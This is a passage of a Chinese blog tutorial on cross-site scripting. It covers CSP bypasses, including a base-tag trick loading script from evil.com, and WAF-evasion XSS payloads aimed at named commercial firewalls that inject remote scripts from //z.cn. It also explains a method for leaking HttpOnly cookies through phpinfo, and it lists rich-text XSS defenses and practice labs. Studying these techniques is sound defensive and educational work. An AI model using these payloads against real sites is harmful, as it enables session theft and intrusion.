+
+<p>但是下列资源类型是阻止预加载的：</p>
+<ul>
+<li>URL中包含下载资源</li>
+<li>页面中包含音频、视频</li>
+<li>POST、PUT和DELET操作的ajax请求</li>
+<li>HTTP认证</li>
+<li>HTTPS页面</li>
+<li>含恶意软件的页面</li>
+<li>弹窗页面</li>
+<li>占用资源很多的页面</li>
+<li>打开了chrome developer tools开发工具</li>
+</ul>
+<p><strong>MIME Sniff</strong></p>
+<p>比如csp可以读图片但是不能读脚本，就可以将代码嵌在图片当中</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;http://xxx.com/xx.jpg&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>base-uri</strong></p>
+<p>当script-src为nonce或无限制，且base-uri无限制时，可通过 <code>base</code> 标签修改根URL来bypass，如下加载了<code>http://evil.com/main.js</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;base href=&quot;http://evil.com/&quot;&gt;<br>&lt;script nonce=&quot;correct value&quot; src=&quot;/main.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>其他更多的参考这篇文章：<a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/xss/csp.html">https://websec.readthedocs.io/zh/latest/vuln/xss/csp.html</a></p>
+<h2 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/rab3it/p/14526596.html">https://www.cnblogs.com/rab3it/p/14526596.html</a></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(1)&lt;/script&gt;<br>//下面是变形<br>&lt;img src=1 onerror=alert(1)&gt;<br><br>&lt;image/src=| onerror = javascript:alert(document.cookie)&gt;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>src=的右边只要是数字、字母之类的，就会被拦截，<code>src=</code>右边是可以<code>接特殊字符串</code>的，所以语句变成如下格式<code>&lt;image/src=|&gt;</code>（注：这个是特殊字符竖杠，不是字母或者数字），这样就绕过了防护。</p>
+</blockquote>
+<p><strong>安全狗</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.safedog.cn/index/privateSolutionIndex.html?tab=2&lt;video/src/onerror=top[`al`%2B`ert`](1);&gt;<br>http://www.safedog.cn/index/privateSolutionIndex.html?tab=2&lt;video/src/onerror=appendChild(createElement(&quot;script&quot;)).src=&quot;//z.cn&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>D盾</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.d99net.net/News.asp?id=126&lt;video/src/onloadstart=top[`al`%2B`ert`](1);&gt;<br>http://www.d99net.net/News.asp?id=126&lt;video/src/onloadstart=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>云锁+奇安信waf</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1&lt;video/src/onloadstart=top[`al`%2B`ert`](1);&gt;<br>http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1&lt;video/src/onloadstart=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="绕http-only"><a href="#绕http-only" class="headerlink" title="绕http-only"></a>绕http-only</h2><p>当一个 cookie 标记为 <code>HttpOnly</code> 时，意味着这个 cookie 只能通过 HTTP 或 HTTPS 协议访问，不能通过 JavaScript 代码访问。也就是不能直接使用<code>document.cookie</code>这样的方式来直接带出cookie</p>
+<p>可以利用phpinfo的<strong>HTTP_COOKIE</strong>字段带出cookie，可以写一个xhr请求访问phpinfo页面然后匹配该字段然后带出cookie。</p>
+<h1 id="富文本XSS"><a href="#富文本XSS" class="headerlink" title="富文本XSS"></a>富文本XSS</h1><p>富文本编辑器是一种允许用户以所见即所得的方式创建和编辑格式化文本的工具。与仅支持纯文本编辑的编辑器不同，富文本编辑器支持一系列文本格式化选项，包括但不限于：</p>
+<ul>
+<li>字体样式（如加粗、斜体、下划线）</li>
+<li>字体大小和颜色</li>
+<li>段落对齐</li>
+<li>列表（有序或无序列表）</li>
+<li>超链接</li>
+<li>图片和媒体嵌入</li>
+<li>表格创建</li>
+<li>头部和脚部注解</li>
+</ul>
+<p>其允许用户输入HTML、JavaScript以及CSS等丰富的内容格式来进行渲染，所以可能会造成xss。</p>
+<p><strong>防御方式</strong></p>
+<p>一般不采用转义的方式进行防御，因为会导致其富文本无法使用，比如有富文本功能的留言框之类的。</p>
+<p>可以采用下面方式来防御和修复：</p>
+<ol>
+<li><strong>输入验证</strong>：对用户输入进行严格的验证，确保不允许不安全的标签和属性。</li>
+<li><strong>输出编码</strong>：在将用户输入的数据渲染到页面上时，对所有用户生成的内容进行HTML编码。</li>
+<li><strong>白名单过滤</strong>：定义一个安全标签和属性的白名单，只允许这些安全的元素被使用。</li>
+<li><strong>内容安全策略（CSP）</strong>：使用CSP来限制可以执行的脚本的来源，减少XSS攻击的风险。</li>
+<li><strong>定期更新</strong>：保持富文本编辑器及其依赖的库是最新的，以利用最新的安全修复。</li>
+<li><strong>安全审计</strong>：定期对富文本编辑器的使用进行安全审计，以发现和修复潜在的安全漏洞。</li>
+</ol>
+<h1 id="XSS相关靶场"><a href="#XSS相关靶场" class="headerlink" title="XSS相关靶场"></a>XSS相关靶场</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://alf.nu/alert1?world=alert&level=alert0">https://alf.nu/alert1?world=alert&amp;level=alert0</a></li>
+<li><a target="_blank" rel="noopener" href="https://prompt.ml/0">https://prompt.ml/0</a></li>
+<li><a target="_blank" rel="noopener" href="https://xss.tesla-space.com/">https://xss.tesla-space.com/</a></li>
+<li>谷歌的xss游戏：<a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://clowsman.github.io">clown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://clowsman.github.io/2024/04/29/xss%E5%AD%A6%E4%B9%A0/">https://clowsman.github.io/2024/04/29/xss学习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://clowsman.github.io" target="_blank">clown</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015048.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="常见webshell流量分析"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015048.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">常见webshell流量分析</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/25/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="哈希长度拓展攻击"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">哈希长度拓展攻击</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/03/MSSQL%E5%AD%A6%E4%B9%A0/" title="MSSQL学习"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154907.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-03</div><div class="title">MSSQL学习</div></div></a></div><div><a href="/2024/02/29/Windows-%E6%8F%90%E6%9D%83/" title="Windows 提权"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154907.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-29</div><div class="title">Windows 提权</div></div></a></div><div><a href="/2024/04/21/Tomcat%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" title="Tomcat常见漏洞"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015053.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-21</div><div class="title">Tomcat常见漏洞</div></div></a></div><div><a href="/2024/04/12/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015048.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-12</div><div class="title">pickle反序列化</div></div></a></div><div><a href="/2024/03/30/redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="redis常见漏洞学习"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-30</div><div class="title">redis常见漏洞学习</div></div></a></div><div><a href="/2024/04/25/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="哈希长度拓展攻击"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-25</div><div class="title">哈希长度拓展攻击</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">clown</div><div class="author-info__description">又菜又爱玩</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/clowsman"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/clowsman" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">xss简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">xss分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">2.1.</span> <span class="toc-text">反射型xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">2.2.</span> <span class="toc-text">存储型xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">2.3.</span> <span class="toc-text">DOM型xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-XSS"><span class="toc-number">2.4.</span> <span class="toc-text">Blind XSS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E5%8D%B1%E5%AE%B3"><span class="toc-number">3.</span> <span class="toc-text">XSS危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">4.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E5%B8%B8%E8%A7%81%E6%A0%87%E7%AD%BE"><span class="toc-number">5.</span> <span class="toc-text">XSS常见标签</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="常见webshell流量分析"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015048.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常见webshell流量分析"/></a><div class="content"><a class="title" href="/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="常见webshell流量分析">常见webshell流量分析</a><time datetime="2024-04-29T05:35:27.000Z" title="发表于 2024-04-29 13:35:27">2024-04-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/29/xss%E5%AD%A6%E4%B9%A0/" title="xss学习"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015048.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="xss学习"/></a><div class="content"><a class="title" href="/2024/04/29/xss%E5%AD%A6%E4%B9%A0/" title="xss学习">xss学习</a><time datetime="2024-04-28T16:37:57.000Z" title="发表于 2024-04-29 00:37:57">2024-04-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/25/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="哈希长度拓展攻击"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="哈希长度拓展攻击"/></a><div class="content"><a class="title" href="/2024/04/25/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="哈希长度拓展攻击">哈希长度拓展攻击</a><time datetime="2024-04-25T15:46:06.000Z" title="发表于 2024-04-25 23:46:06">2024-04-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/24/ctfshow-web859/" title="ctfshow_web859"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015053.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow_web859"/></a><div class="content"><a class="title" href="/2024/04/24/ctfshow-web859/" title="ctfshow_web859">ctfshow_web859</a><time datetime="2024-04-24T02:59:47.000Z" title="发表于 2024-04-24 10:59:47">2024-04-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/22/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="waf绕过学习"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015053.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="waf绕过学习"/></a><div class="content"><a class="title" href="/2024/04/22/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="waf绕过学习">waf绕过学习</a><time datetime="2024-04-21T16:08:20.000Z" title="发表于 2024-04-22 00:08:20">2024-04-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By clown</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
